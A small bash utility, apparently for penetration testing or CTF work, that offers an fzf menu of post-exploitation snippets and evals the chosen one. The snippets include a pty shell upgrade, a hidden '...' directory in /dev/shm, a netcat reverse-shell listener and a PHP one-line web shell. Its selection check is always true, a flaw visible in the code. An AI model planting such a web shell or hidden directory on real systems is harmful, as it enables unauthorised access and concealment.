#!/usr/bin/env bash

declare -A SNIPPETS

SNIPPETS["privesc-upgrade-tty"]="python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
SNIPPETS["privesc-upgrade-fulltty"]="export TERM=xterm; stty rows 38 columns 116"
SNIPPETS["hdir"]="mkdir '/dev/shm/...'; cd '/dev/shm/...'"
SNIPPETS["listen-netcat"]="rlwrap nc -nlvp $RANDOM"
SNIPPETS["php-onliner-shell"]="<?php system($_GET['']); ?>"

key_value_list=""
for key in "${!SNIPPETS[@]}"; do
  key_value_list+="$key:${SNIPPETS[$key]}\n"
done

selected_key=$(
  echo -e "$key_value_list" | fzf \
    --prompt="Select a snippet: " \
    --height=10 \
    --border \
    --reverse \
    --delimiter=":" \
    --with-nth=1 \
    --preview="echo -e \"Value:\n\n{2}\""
)

[[ -n !$selected_key ]] && {
  echo ${selected_key#*:}
  eval ${selected_key#*:}
}

# case selected_key:
#   1) echo 1
#   ;;
#   2|3) echo 2 or 3
#   ;;
#   *) echo default
#   ;;
# esac
